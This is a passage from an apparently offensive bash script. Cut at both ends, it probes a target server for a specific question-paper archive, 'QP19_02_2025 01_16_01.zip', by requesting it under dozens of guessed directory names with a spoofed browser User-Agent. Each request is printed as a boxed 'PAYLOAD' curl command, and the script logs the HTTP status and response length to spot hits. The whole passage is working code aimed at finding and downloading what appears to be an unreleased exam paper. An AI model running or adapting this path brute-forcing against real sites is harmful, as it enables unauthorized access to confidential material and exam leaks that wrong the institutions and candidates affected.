" "${target}QuestionPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploaderSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploaderSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploaderSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuiteTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuiteTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuiteTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandlerProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandlerProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandlerProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploadAutomation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploadAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploadAutomation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManagerTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManagerTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManagerTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdminCloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdminCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdminCloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystemQPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystemQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystemQPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-Service/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-Service/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocBulkUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocBulkUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-Dashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-Dashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-DataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-DataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager_QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager_QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
